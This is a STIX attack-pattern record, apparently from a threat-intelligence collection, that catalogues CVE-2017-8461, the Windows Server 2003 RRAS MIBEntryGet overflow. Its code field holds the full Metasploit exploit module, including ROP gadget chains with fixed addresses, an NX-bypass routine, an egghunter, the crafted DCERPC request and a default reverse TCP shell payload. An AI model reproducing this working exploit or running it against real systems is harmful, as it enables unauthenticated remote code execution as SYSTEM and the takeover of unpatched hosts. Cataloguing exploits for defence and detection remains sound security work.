{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8031afdd-e88d-4b55-94fe-e2eb50bafefa",
    "created": "2024-08-14T16:56:25.212671Z",
    "modified": "2024-08-14T16:56:25.212675Z",
    "name": "Microsoft Windows RRAS Service MIBEntryGet Overflow",
    "description": " This module exploits an overflow in the Windows Routing and Remote Access Service (RRAS) to execute code as SYSTEM.  The RRAS DCERPC endpoint is accessible to unauthenticated users via SMBv1 browser named pipe on Windows Server 2003 and Windows XP hosts; however, this module targets Windows Server 2003 only.  Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well.  The module has been successfully tested on:  Windows Server 2003 SP0 (x86); Windows Server 2003 SP1 (x86); Windows Server 2003 SP2 (x86); and Windows Server 2003 R2 SP2 (x86). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/smb_rras_erraticgopher.rb",
            "external_id": "smb_rras_erraticgopher.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8461"
        },
        {
            "source_name": "reference",
            "url": "https://www.securitytracker.com/id/1038701"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/windows/exploits/Erraticgopher-1.0.1.0.xml"
        },
        {
            "source_name": "reference",
            "url": "https://support.microsoft.com/en-us/topic/microsoft-security-advisory-4025685-guidance-for-older-platforms-june-13-2017-05151e8a-bd7f-f769-43df-38d2c24f96cd"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa374540(v=vs.85)"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/ebc5c709-36d8-4520-a0ac-6f36d2d6c0b2"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/5dca234b-bea4-4e67-958e-5459a32a7b71"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/4305d67f-9273-49fe-a067-909b6ae8a341"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/3ca0723e-36ea-448a-a97e-1906dd3d07a6"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/dda988f0-4cce-4ffe-b8c9-d5199deafba5"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/169e435d-a975-4c1c-bf41-55fd2bd76125"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows RRAS Service MIBEntryGet Overflow',\n        'Description' => %q{\n          This module exploits an overflow in the Windows Routing and Remote\n          Access Service (RRAS) to execute code as SYSTEM.\n\n          The RRAS DCERPC endpoint is accessible to unauthenticated users via\n          SMBv1 browser named pipe on Windows Server 2003 and Windows XP hosts;\n          however, this module targets Windows Server 2003 only.\n\n          Since the service is hosted inside svchost.exe, a failed exploit\n          attempt can cause other system services to fail as well.\n\n          The module has been successfully tested on:\n\n          Windows Server 2003 SP0 (x86);\n          Windows Server 2003 SP1 (x86);\n          Windows Server 2003 SP2 (x86); and\n          Windows Server 2003 R2 SP2 (x86).\n        },\n        'Author' => [\n          'Equation Group', # ERRATICGOPHER\n          'Shadow Brokers', # Equation Group dump\n          'V\u00edctor Portal', # Python exploit for Windows Server 2003 SP2 with DEP bypass\n          'bcoles', # Metasploit\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2017-8461'],\n          ['CWE', '119'],\n          ['BID', '99012'],\n          ['EDB', '41929'],\n          ['PACKETSTORM', '147593'],\n          ['URL', 'https://www.securitytracker.com/id/1038701'],\n          ['URL', 'https://github.com/x0rz/EQGRP_Lost_in_Translation/blob/master/windows/exploits/Erraticgopher-1.0.1.0.xml'],\n          ['URL', 'https://support.microsoft.com/en-us/topic/microsoft-security-advisory-4025685-guidance-for-older-platforms-june-13-2017-05151e8a-bd7f-f769-43df-38d2c24f96cd'],\n          ['URL', 'https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa374540(v=vs.85)'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/ebc5c709-36d8-4520-a0ac-6f36d2d6c0b2'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/5dca234b-bea4-4e67-958e-5459a32a7b71'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/4305d67f-9273-49fe-a067-909b6ae8a341'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/3ca0723e-36ea-448a-a97e-1906dd3d07a6'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/dda988f0-4cce-4ffe-b8c9-d5199deafba5'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/169e435d-a975-4c1c-bf41-55fd2bd76125'],\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread',\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'Privileged' => true,\n        'Payload' => {\n          'Space' => 1065,\n          'BadChars' => \"\\x00\",\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed\n        },\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'Targets' => [\n          [ 'Automatic', { 'auto' => true } ],\n          [\n            'Windows Server 2003 SP0 (English)',\n            {\n              'os' => 'Windows 2003',\n              'sp' => '',\n              'lang' => 'English'\n            }\n          ],\n          [\n            'Windows Server 2003 SP1 (English) (NX)',\n            {\n              'os' => 'Windows 2003',\n              'sp' => 'Service Pack 1',\n              'lang' => 'English'\n            }\n          ],\n          [\n            'Windows Server 2003 SP2 (English) (NX)',\n            {\n              'os' => 'Windows 2003',\n              'sp' => 'Service Pack 2',\n              'lang' => 'English'\n            }\n          ],\n          [\n            'Windows Server 2003 R2 SP2 (English) (NX)',\n            {\n              'os' => 'Windows 2003 R2',\n              'sp' => 'Service Pack 2',\n              'lang' => 'English'\n            }\n          ],\n        ],\n        'Notes' => {\n          'AKA' => [ 'ErraticGopher' ],\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ UNRELIABLE_SESSION ]\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2017-06-13'\n      )\n    )\n\n    register_options([\n      OptString.new('SMBPIPE', [ true, 'The pipe name to use', 'browser']),\n    ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def payload_win2k3sp0\n    rop = [0x0ffef4c9].pack('V')\n    # rsaenh.dll:\n    # 0FFEF4C9   54               PUSH ESP\n    # 0FFEF4CA   24 04            AND AL,4\n    # 0FFEF4CC   8B4C24 0C        MOV ECX,DWORD PTR SS:[ESP+C]\n    # 0FFEF4D0   8B4424 08        MOV EAX,DWORD PTR SS:[ESP+8]\n    # 0FFEF4D4   3BD1             CMP EDX,ECX\n    # 0FFEF4D6   73 05            JNB SHORT rsaenh.0FFEF4DD\n    # 0FFEF4D8   F7F1             DIV ECX\n    # 0FFEF4DA   C2 0C00          RETN 0C\n    rop += make_nops(1152 - payload.encoded.length)\n    rop += payload.encoded\n    rop\n  end\n\n  def payload_win2k3sp1\n    egg_options = {\n      eggtag: rand_text_alpha(4)\n    }\n\n    hunter, egg = generate_egghunter(\n      payload.encoded,\n      payload_badchars,\n      egg_options\n    )\n\n    # NX disable routine for Windows Server 2003 SP1\n    rop = [0x71c0bf7c].pack('V')   # push esp ; pop esi ; retn @ws2_32.dll\n    rop += \"\\x90\" * 16             # padding\n    rop += [0x77c1a864].pack('V')  # push esp ; pop ebp ; retn 4 @gdi32.dll\n    rop += [0x7c803ec2].pack('V')  # ret 20 @ntdll.dll\n    rop += [0x773b24da].pack('V')  # jmp esp @user32.dll\n    rop += [0x77bde7f6].pack('V')  # add esp,2c ; retn @msvcrt.dll\n    rop += \"\\x90\" * 2              # padding\n    rop += hunter                  # egg hunter\n    rop += \"\\x90\" * 42             # padding\n    rop += [0x7c83e413].pack('V')  # disable NX routine @ntdll.dll\n    rop += \"\\x90\" * 104            # padding\n    rop += egg                     # egg + payload\n    rop\n  end\n\n  def payload_win2k3sp2\n    egg_options = {\n      eggtag: rand_text_alpha(4)\n    }\n\n    hunter, egg = generate_egghunter(\n      payload.encoded,\n      payload_badchars,\n      egg_options\n    )\n\n    # NX disable routine for Windows Server 2003 [R2] SP2\n    rop = [0x71c0db30].pack('V')   # push esp ; pop esi ; retn @ws2_32.dll\n    rop += \"\\x90\" * 16             # padding\n    rop += [0x77c177e9].pack('V')  # push esp ; pop ebp ; retn 4 @gdi32.dll\n    rop += [0x7c817a5d].pack('V')  # ret 20 @ntdll.dll\n    rop += [0x77384271].pack('V')  # jmp esp @user32.dll\n    rop += [0x77bde7f6].pack('V')  # add esp,2c ; retn @msvcrt.dll\n    rop += \"\\x90\" * 2              # padding\n    rop += hunter                  # egg hunter\n    rop += \"\\x90\" * 42             # padding\n    rop += [0x7c83f517].pack('V')  # disable NX routine @ntdll.dll\n    rop += \"\\x90\" * 104            # padding\n    rop += egg                     # egg + payload\n    rop\n  end\n\n  def check\n    begin\n      connect(versions: [1])\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      if e.message.include?('Connection reset')\n        return CheckCode::Unknown('Connection reset during login. This most likely means a previous exploit attempt caused the service to crash.')\n      end\n\n      return CheckCode::Safe(\"SMB error: #{e.message}\")\n    end\n\n    handle = dcerpc_handle('8f09f000-b7ed-11ce-bbd2-00001a181cad', '0.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n\n    begin\n      dcerpc_bind(handle)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      return CheckCode::Safe(\"SMB error: #{e.message}\")\n    end\n\n    CheckCode::Detected('RRAS enabled and accessible.')\n  end\n\n  def exploit\n    begin\n      connect(versions: [1])\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      if e.message.include?('Connection reset')\n        fail_with(Failure::UnexpectedReply, 'Connection reset during login. This most likely means a previous exploit attempt caused the service to crash.')\n      end\n      raise e\n    end\n\n    handle = dcerpc_handle('8f09f000-b7ed-11ce-bbd2-00001a181cad', '0.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n\n    print_status(\"Binding to #{handle} ...\")\n\n    begin\n      dcerpc_bind(handle)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      fail_with(Failure::NotVulnerable, \"SMB error: #{e.message}\")\n    end\n\n    print_status(\"Bound to #{handle} ...\")\n\n    my_target = target\n\n    if target.name == 'Automatic'\n      print_status('Selecting a target ...')\n\n      fingerprint = smb_fingerprint\n\n      os = fingerprint['os']\n      sp = fingerprint['sp']\n      lang = fingerprint['lang']\n      print_status(\"Fingerprint: #{os}#{sp.blank? ? '' : \" (#{sp})\"} - Language: #{lang}\")\n\n      if lang == 'Unknown'\n        lang = 'English'\n        print_status(\"Could not detect the language pack, defaulting to #{lang}\")\n      end\n\n      my_target = targets.select { |t| t['os'] == os && t['sp'] == sp && t['lang'] == lang }.first\n\n      unless my_target\n        fail_with(Failure::NoTarget, 'Unable to automatically detect a target')\n      end\n    end\n\n    print_status(\"Using target: #{my_target.name}\")\n\n    case my_target.name\n    when 'Windows Server 2003 SP0 (English)'\n      buf = payload_win2k3sp0\n    when 'Windows Server 2003 SP1 (English) (NX)'\n      buf = payload_win2k3sp1\n    when 'Windows Server 2003 SP2 (English) (NX)'\n      buf = payload_win2k3sp2\n    when 'Windows Server 2003 R2 SP2 (English) (NX)'\n      buf = payload_win2k3sp2 # same as SP2\n    else\n      fail_with(Failure::NoTarget, 'Invalid target')\n    end\n\n    mib = NDR.long(8)                    # dwVarID (MIB_OPAQUE_QUERY)                  # IP_FORWARDROW\n    mib += \"\\x90\" * 4                    # rgdwVarIndex[0] dwForwardDest               # junk IPv4 address\n    mib += NDR.long(0)                   # rgdwVarIndex[1] dwForwardMask               # junk IPv4 net mask\n    mib += NDR.long(0)                   # rgdwVarIndex[2] dwForwardPolicy             # 0 (default forward policy)\n    mib += \"\\x90\" * 4                    # rgdwVarIndex[3] dwForwardNextHop            # junk IPv4 address\n    mib += \"\\x90\" * 4                    # rgdwVarIndex[4] dwForwardIfIndex            # junk network interface index for next hop\n    mib += buf                           # rgdwVarIndex[5] dwForwardType               # payload\n    mib += \"\\x90\" * (1840 - mib.length)  # MIB length padding                          # junk\n\n    stub = NDR.long(0x21)                # dwPid (RMIBEntryGet)                        # PID_IP (IPv4)\n    stub += NDR.long(0x2710)             # dwRoutingPid (RMIBEntryGet)                 # IPRTRMGR_PID (IP router manager)\n    stub += NDR.long(mib.length)         # dwMibInEntrySize (DIM_MIB_ENTRY_CONTAINER)  # MIB in size\n    stub += \"\\x90\" * 4                   # pMibInEntry (DIM_MIB_ENTRY_CONTAINER)       # MIB_OPAQUE_QUERY pointer (ignored)\n    stub += NDR.long(4)                  # dwVarId (MIB_OPAQUE_QUERY)                  # IP_ADDRTABLE\n    stub += \"\\x90\" * 4                   # rgdwVarIndex (MIB_OPAQUE_QUERY)             # unused (ignored)\n    stub += NDR.long(mib.length)         # dwMibOutEntrySize (DIM_MIB_ENTRY_CONTAINER) # MIB out size\n    stub += mib                          # our friendly MIB entry data with payload\n    stub += NDR.long(4)                  # dwId (MIB_OPAQUE_INFO)                      # IP_ADDRTABLE (same as dwVarId)\n    stub += NDR.long(0)                  # ullAlign (MIB_OPAQUE_INFO)                  # zero aligning bytes\n\n    print_status(\"Calling RRAS MIBEntryGet with payload (#{stub.length} bytes) ...\")\n\n    begin\n      dcerpc.call(0x1d, stub, false)\n    rescue StandardError => e\n      raise e unless e.to_s.include?('STATUS_PIPE_DISCONNECTED')\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-06-13",
    "x_mitre_platforms": [
        "win'"
    ]
}